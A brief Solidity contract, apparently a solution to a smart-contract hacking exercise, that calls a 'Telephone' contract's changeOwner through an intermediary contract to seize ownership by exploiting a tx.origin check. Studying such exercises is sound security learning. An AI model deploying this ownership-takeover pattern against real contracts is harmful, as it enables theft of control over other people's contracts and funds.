// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Telephone.sol";

contract TelephoneHacker {

    Telephone public otherContract;

    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function assignContract(address _otherContract) public {
        otherContract = Telephone(_otherContract);
    }

    function hackContract() external {
        otherContract.changeOwner(owner);
    }

}